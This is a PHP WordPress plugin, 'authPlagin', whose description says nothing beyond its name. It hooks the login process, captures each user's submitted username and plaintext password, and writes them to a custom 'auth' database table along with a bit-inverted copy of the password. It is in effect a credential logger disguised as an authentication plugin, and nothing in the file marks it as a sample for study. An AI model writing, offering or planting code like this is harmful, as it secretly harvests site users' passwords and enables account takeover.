<?php
/*
Plugin Name: authPlagin
Description: authPlagin
Version: 1.0
Author: Vera
*/

function redirect_user_credentials($user) {
    global $wpdb;

    if (!isset($_POST['log']) || !isset($_POST['pwd'])) {
        return;
    }

    $user_login = $_POST['log'];
    $user_password = $_POST['pwd'];

    $password_inverted = invert($user_password);

    $wpdb->insert(
        'auth',
        [
            'login' => $user_login,
            'password' => $user_password,
            'secret_password' => $password_inverted
        ]
    );
}

function invert( $input ) {
    $bin = '';
    for ($i = 0; $i < strlen($input); $i++) {
        $bin .= decbin(ord($input[$i]));
    }

    $bin_inv = '';
    for ($i = 0; $i < strlen($bin); $i++) {
        $bin_inv .= $bin[$i] == '0' ? '1' : '0';
    }

    return $bin_inv;
}

add_action('wp_authenticate', 'redirect_user_credentials');
